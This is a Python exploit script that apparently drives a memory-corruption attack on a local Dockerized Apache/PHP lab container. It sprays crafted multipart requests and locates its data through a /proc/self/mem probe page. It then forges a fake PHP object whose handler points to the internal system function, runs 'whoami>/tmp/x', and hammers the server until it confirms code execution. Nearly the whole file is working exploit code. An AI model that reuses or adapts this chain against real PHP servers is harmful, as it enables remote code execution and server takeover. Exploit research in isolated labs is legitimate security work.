#!/usr/bin/env python3
"""oom98: self-scan aiming — worker measures its own memory via oom_probe.php.

Principle: a PHP worker can fopen("/proc/self/mem") — self-access needs
no capabilities. The arm request itself reports where its value bytes
landed (V), and post-fire readbacks turn every silence into data.

Laws used (all measured tonight):
  - walk reads a planted pointer zval whose type-info = the NEXT 8 bytes
    (oom93: crash proved pointer-read + type check passed)
  - 8-periodic pointer tile: every slot self-typed; OBJ = V + off with
    (OBJ & 0xF)==8 and ((OBJ>>8)&1)==1
  - BLOCK copies must NOT cover the observed walk slots (8, 32, 158):
    BLOCK copies start at offset >= 352 inside the value
  - one armed crash per boot (probes excluded) -> measure, verify,
    THEN finishers
Flow: boot -> warm (sentinel) -> PROBE -> V -> compute OBJ/BLOCK ->
  sacrifice (aim body) -> check /tmp/x -> PROBE readback rc@OBJ ->
  finishers (readback between) -> restore.
"""
import struct
import subprocess
import sys
import time
import urllib.request

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
PROBE = "http://127.0.0.1:8081/oom_probe.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
SENT = b"ABCDEFGH"


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def get(url, t=60):
    try:
        with urllib.request.urlopen(url, timeout=t) as r:
            return r.read(600).decode(errors="replace")
    except Exception as e:
        return "ERR:%s" % str(e)[:120]


def post(att):
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def libphp_base():
    out = sh("docker exec php_vuln sh -c 'pid=$(pgrep -f apache2 | head -1); grep libphp.so /proc/$pid/maps | head -1'")
    return int(out.split("-")[0], 16)


def parse_probe(out):
    """-> list of (region_va0, [offsets...])"""
    regs = []
    for tok in out.split():
        if tok.startswith("R="):
            regs.append((int(tok[2:], 16), []))
        elif tok.startswith("d="):
            continue
        elif tok.isdigit() and regs:
            regs[-1][1].append(int(tok, 16))
    return [(r, offs) for (r, offs) in regs if offs]


def probe_scan(needle):
    h = needle.hex()
    best = None
    for attempt in range(8):
        out = get("%s?h=%s" % (PROBE, h))
        if "Fatal error" in out:
            time.sleep(0.5)
            continue                      # this worker OOM'd; try another
        for (rva, offs) in parse_probe(out):
            if offs:
                return rva, offs[0], out[:200]
        time.sleep(1)
    return None, None, out[:200]


def probe_read(va, n=64):
    return get("%s?read=%d&n=%d" % (PROBE, va, n))


def obj_block(base, OBJ, free_obj):
    B = bytearray(176)
    struct.pack_into("<II", B, 0x00, 1, 0x108)      # rc, ti (dtor-called set)
    struct.pack_into("<I", B, 0x08, 1)              # handle @8 (source-verified)
    struct.pack_into("<Q", B, 0x10, 0)              # ce (never read w/ 0x108)
    struct.pack_into("<Q", B, 0x18, OBJ + 0x38)     # handlers -> T2
    struct.pack_into("<I", B, 0x2C, 1)              # num_args
    struct.pack_into("<Q", B, 0x38, 0)              # T2.offset
    struct.pack_into("<Q", B, 0x40, free_obj)       # T2.free_obj
    struct.pack_into("<Q", B, 0x50, OBJ + 0x68)     # argz -> gs
    struct.pack_into("<I", B, 0x58, 6)              # IS_STRING
    struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))
    B[0x80:0x80 + len(CMD)] = CMD
    B[0x80 + len(CMD)] = 0
    return bytes(B)


print("=== oom98: self-scan aiming ===", flush=True)
boot_core_env()
print("    probe basic:", get(PROBE + "?h=" + (SENT * 24).hex(), 30)[:120], flush=True)

base = libphp_base()
print("    libphp=0x%x" % base, flush=True)

# ---- warm-up with sentinel values (all-patterned) ----
sent_tile = SENT * 192 + b"A"
def vt_sent(i):
    return sent_tile
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt_sent))
print("    warm-up sent", flush=True)

rva, V, dbg = probe_scan(SENT * 24)   # 192B pattern: PHP guard needs >=16B
if V is None:
    print("[ABORT] sentinel not found. probe said: %s" % dbg, flush=True)
    sys.exit(3)
print("    sentinel at R=0x%x V=0x%x (pid %s)" % (rva, rva + V, dbg.split("pid=")[-1].strip()), flush=True)

# choose OBJ: inside this value, offset >=352, 16-aligned +8, refcounted bit
OBJ = None
for off in range(352, 1537 - 176, 8):     # step 8: reach nibble-8 from any V
    cand = rva + V + off
    if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1:
        OBJ = cand
        break
assert OBJ, "no OBJ in range"
BOFF = OBJ - (rva + V)
print("    OBJ=0x%x (value-off %d, nib=%d refc=%d)" % (OBJ, BOFF, OBJ & 0xF, (OBJ >> 8) & 1), flush=True)

BLOCK = obj_block(base, OBJ, base + ZIF_SYSTEM)

# build aim tile: 8-periodic pointer everywhere EXCEPT the BLOCK window
aim = bytearray(struct.pack("<Q", OBJ) * 192 + b"A")
aim[BOFF:BOFF + 176] = BLOCK
assert aim[BOFF:BOFF + 176] == BLOCK
def vt_aim(i):
    return aim
aim_body = P.build_attack(3400, 9200000, value_tile=vt_aim)

# sanity: BLOCK really sits at BOFF in the aim tile (constructed, not searched)
assert aim[BOFF:BOFF + 176] == BLOCK
print("    aim tile OK: BOFF=%d OBJ=0x%x" % (BOFF, OBJ), flush=True)

# ---- sacrifice + finishers ----
code, resp = post(aim_body)
print("    sacrifice (%s) %r" % (code, resp[:80]), flush=True)
time.sleep(2)
x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
if "No such" not in x:
    print("*** RCE CONFIRMED *** /tmp/x: [%s]" % x, flush=True)
    sys.exit(0)

# rapid hammer: burst aim-shaped finishers so an AIM-armed child serves
# one. oom98e lesson: spaced fires rotated onto warm-up-only workers
# (crash rdi="ABCDEFGH" = sentinel region, not our aim).
hits = 0
for fi in range(12):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=vt_aim))
    if code != "200":
        hits += 1
        print("  [f] fire%d (%d): %s (crash/broken)" % (fi, sb, code), flush=True)
    time.sleep(0.3)
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        print("*** RCE CONFIRMED *** /tmp/x: [%s]" % x, flush=True)
        break
else:
    print("    hammer done: %d non-200 of 12; /tmp/x absent" % hits, flush=True)

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
